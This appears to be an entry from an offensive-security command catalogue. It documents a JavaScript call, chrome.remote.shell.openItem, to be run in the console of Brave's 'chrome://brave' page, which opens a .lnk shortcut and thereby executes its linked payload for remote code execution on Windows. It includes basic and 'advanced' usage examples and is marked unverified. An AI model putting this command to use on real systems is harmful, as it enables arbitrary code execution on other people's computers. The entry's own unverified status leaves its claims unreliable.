---
id: cmd-uuid-1
data: 'chrome.remote.shell.openItem("C://temp//test.lnk")'
tags:
  - rce
  - execution
type: command
output: null
executor: javascript
platforms:
  - Microsoft Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:31.247Z'
verified: false
validated: true
submitted: true
---
# chrome-remote-shell-openitem-temp

## Command

```javascript
chrome.remote.shell.openItem("C://temp//test.lnk");
```

## Description

This JavaScript command, executed in the console of the 'chrome://brave' page, uses the Chrome remote shell API to open a local .lnk shortcut file in the temp directory, leading to execution of the linked payload for RCE on Windows.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| path | Full path to .lnk or executable, using double slashes for escaping (e.g., "C://temp//test.lnk") | Yes |

## Examples

### Basic Usage

```javascript
chrome.remote.shell.openItem("C://temp//test.lnk");
```

### Advanced Usage

```javascript
chrome.remote.shell.openItem("C://Windows//System32//calc.exe");
```

## Expected Output

No console output; success indicated by the linked application or command executing on the system (e.g., calculator launches if test.lnk points to calc.exe). Failure may show API errors if path invalid.

## Related

- [[Related Procedure: Execute-RCE-on-chrome-brave-Page]]
